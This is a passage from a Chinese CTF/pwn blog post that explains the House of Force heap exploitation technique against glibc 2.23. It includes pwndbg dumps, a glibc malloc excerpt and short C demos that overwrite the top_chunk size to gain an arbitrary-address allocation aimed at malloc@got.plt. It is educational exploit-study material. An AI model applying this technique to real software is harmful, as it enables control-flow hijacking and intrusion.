+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x602300</span></span><br><span class="line"><span class="number">0x602300</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span>==&gt;chunk1</span><br><span class="line"><span class="number">0x602310</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602320</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000031</span>==&gt;chunk2</span><br><span class="line"><span class="number">0x602330</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602340</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602350</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000041</span>==&gt;chunk3</span><br><span class="line"><span class="number">0x602360</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602370</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602380</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602390</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020c71</span>==&gt;top_chunk</span><br><span class="line"><span class="number">0x6023a0</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6023b0</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现，系统又开辟了一个 0x41 大小的内存空间，此时 top_chunk_size 减小了 0x40。</p>
+<p><strong><font style="color:#DF2A3F;">tip）：</font><strong>这里对多出的 1 做个解释： 观察到的</strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">top_chunk_size 减少 0x40、但实际分配 0x41 空间，</font></strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">核心原因是因为 glibc 堆的 size 段低 3 位是标志位，并不参与实际内存大小计算。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">综上得出：在分配比 top_chunk 小的 chunk 的时候，会从 top_chunk 中分割，并且 top_chunk 向下移动（：：前提是没有可以使用的 bins,否则先从 bins 中取）</font></p>
+<h3 id="House-Of-Force-利用原理"><a href="#House-Of-Force-利用原理" class="headerlink" title="House Of Force 利用原理"></a><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">House Of Force 利用原理</font></h3><p>如果一个堆漏洞想要通过 House Of Force 进行利用，就必须满足以下条件：</p>
+<p><strong>能够以溢出等方式控制 top_chunk 的 size 域且能够自由控制堆分配尺寸的大小。</strong></p>
+<p>我们知道，在分配堆块时，如果所有空闲的 bins 都无法满足需求，就会从 top_chunk 中分割出相应的大小作为堆块的空间。如果我们可以控制 top_chunk_size 的值，就可以使 top_chunk 指向我们所期望的任何位置，就相当于是一次任意地址写。</p>
+<p>不过在 glibc 中，会对用户请求的大小和 top_chunk 现有的 size 进行验证：</p>
+<p>libc 2.23 源码 3793-3809 行</p>
+<p><img src="/HFTTC.github.io/./img/E0LQqGr7lOYojfZw/1769761912992-8b8e0cc7-c3c6-4666-9309-be3685f119ec-375588.png" alt="1769761912992-8b8e0cc7-c3c6-4666-9309-be3685f119ec.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;                           <span class="comment">//获取当前top_chunk的大小</span></span><br><span class="line">size = chunksize (victim);                  <span class="comment">//计算top_chunk的大小</span></span><br><span class="line"><span class="comment">//如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;                <span class="comment">//top_chunk指针更新</span></span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                                            <span class="comment">//更新top_chunk_size</span></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果 top_chunk_size 被篡改成很大的值，就可以轻松通过这个验证。若要绕过这个验证，我们一般的做法是将 top_chunk_siza 修改为-1，因为在进行比较的时候会将 size 转换为无符号数，也就是将-1 转换为 unsigned long 中最大的时候，因此无论如何都可以通过验证。验证通过之后，会将 top_chunk 指针进行更新，接下来的堆块就会分配到这个位置。用户只要控制了这个指针就相当于控制了任意地址。与此同时 top_chunk 的 size 也会更新。</p>
+<p>如果我们想要下次再指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+MINSIZE</p>
+<h4 id="HOF-向前控制内存"><a href="#HOF-向前控制内存" class="headerlink" title="HOF 向前控制内存"></a>HOF 向前控制内存</h4><p>下面会举例说明 House Of Force 的利用：</p>
+<p>该例子是通过 House Of Force 来篡改 <a href="mailto:&#x6d;&#x61;&#x6c;&#x6c;&#x6f;&#99;&#x40;&#x67;&#111;&#116;&#x2e;&#112;&#x6c;&#116;">malloc@got.plt</a> 实现劫持程序流程。</p>
+<p>示例的源代码如下：top_chunk_demo1</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">	ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">	*ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ptr&#x3D;(long *)(((long)ptr)+24);：让 ptr 精准指向 top_chunk 的 size 域，直接调试到这一步之前更清晰：ptr 本身指向的是就是 chunk1 的 data 域即第 16 字节处，+16+8&#x3D;24 恰好修改到 top_chunk 的 size 字节。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/kali/Desktop/top_chunk_demo1.c:<span class="number">6</span></span><br><span class="line">    <span class="number">1</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="number">2</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">    3 &#123;</span><br><span class="line">    <span class="number">4</span>     <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    <span class="number">5</span>     ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"> ►  <span class="number">6</span>     ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    <span class="number">7</span>     *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="number">8</span>     <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="number">9</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">   <span class="number">10</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">11</span> &#125;</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602300</span></span><br><span class="line"><span class="number">0x602300</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span>==&gt;chunk1</span><br><span class="line"><span class="number">0x602310</span>:       <span class="number">0x0000000000000000</span> ptr  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602320</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020ce1</span>==&gt;top_chunk</span><br><span class="line"><span class="number">0x602330</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602340</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602350</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602360</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>我们按照程序运行过程继续调试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/kali/Desktop/top_chunk_demo1.c:<span class="number">7</span></span><br><span class="line">    <span class="number">1</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="number">2</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">    3 &#123;</span><br><span class="line">    <span class="number">4</span>     <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    <span class="number">5</span>     ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="number">6</span>     ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line"> ►  <span class="number">7</span>     *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="number">8</span>     <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="number">9</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">   <span class="number">10</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">11</span> &#125;</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602300</span></span><br><span class="line"><span class="number">0x602300</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span>==&gt;chunk1</span><br><span class="line"><span class="number">0x602310</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602320</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020ce1</span>==&gt;ptr==&gt;top_chunk</span><br><span class="line"><span class="number">0x602330</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602340</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602350</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602360</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>执行到运行完*ptr&#x3D;-1，我们可以看见 top_chunk 的 size 域已经被修改为最大无符号长整型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">7</span>     *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line"> ►  <span class="number">8</span>     <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="number">9</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">   <span class="number">10</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602300</span></span><br><span class="line"><span class="number">0x602300</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602310</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602320</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x602330</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602340</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602350</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>在我们真正的题目当中，这一步可以通过堆溢出漏洞来实现，直接赋值-1 即可。</p>
+<p>我们一开始的目标是利用 HOF 篡改 <a href="mailto:&#109;&#97;&#108;&#108;&#111;&#x63;&#x40;&#103;&#111;&#116;&#46;&#112;&#108;&#x74;">malloc@got.plt</a> 实现劫持程序流程，之后就要执行 malloc(-4120);</p>
+<p>继续运行到执行完 malloc(-4120)之后，再进行 malloc（0x10）就可以控制 <a href="mailto:&#x6d;&#x61;&#108;&#108;&#111;&#99;&#x40;&#103;&#x6f;&#x74;&#x2e;&#x70;&#x6c;&#116;">malloc@got.plt</a> 了</p>
+<p>由于本机可能因为版本原因，无法达到程序运行完预想的效果，就不再演示，在实际题目中思路是相同的。</p>
+<h4 id="HOF-向后控制内存"><a href="#HOF-向后控制内存" class="headerlink" title="HOF 向后控制内存"></a>HOF 向后控制内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== 修改top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== 增大top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路一样，增大 topchunk 指针，使其往后指，控制关键地址</p>
+<blockquote>
+<p>更新: 2026-03-17 21:31:53<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/vt5mrvnq9qeeukc7">https://www.yuque.com/idcm/wnemg9/vt5mrvnq9qeeukc7</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="houseoforange_hitcon_2016" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofOrangeglibc-2.23/houseoforange_hitcon_2016/" aria-label="前一篇: houseoforange_hitcon_2016" title="前一篇: houseoforange_hitcon_2016"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            houseoforange_hitcon_2016
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="HouseOfForce例题" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseOfForce%EF%BC%88topchunk%EF%BC%89/HouseOfForce%E4%BE%8B%E9%A2%98/" aria-label="后一篇: HouseOfForce例题"  title="后一篇: HouseOfForce例题"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          HouseOfForce例题
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force%EF%BC%88topchunk%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">House Of Force（topchunk）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-House-Of-Force%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 House Of Force？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#top-chunk"><span class="toc-number">1.2.</span> <span class="toc-text">top_chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E5%AE%9E%E4%BE%8B-top-chunk-demo"><span class="toc-number">1.3.</span> <span class="toc-text">引入实例 top_chunk_demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-Of-Force-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">House Of Force 利用原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HOF-%E5%90%91%E5%89%8D%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98"><span class="toc-number">1.4.1.</span> <span class="toc-text">HOF 向前控制内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HOF-%E5%90%91%E5%90%8E%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98"><span class="toc-number">1.4.2.</span> <span class="toc-text">HOF 向后控制内存</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "index",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseOfForce%EF%BC%88topchunk%EF%BC%89/index/",
+          excerpt: "",
+          description: "",
+          stripContent: "House Of Force（topchunk）什么是 House Of Force？ _House Of Force（HoF）_的命名，核心是用「House」指代堆内存空间、「Force」指代 “强制篡改堆布局以劫持分配” 的核心攻击逻辑 。House Of Force 是一种堆的利用方法 其主要原理是控制 heap 中的 top_chunk 并 malloc 来达到控制任意内存的空间。既然是控制 top_chunk，那就先了解一下 top_chunk： top_chunktop_chunk ",
+          date: "Tue Apr 28 2026 18:25:57 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
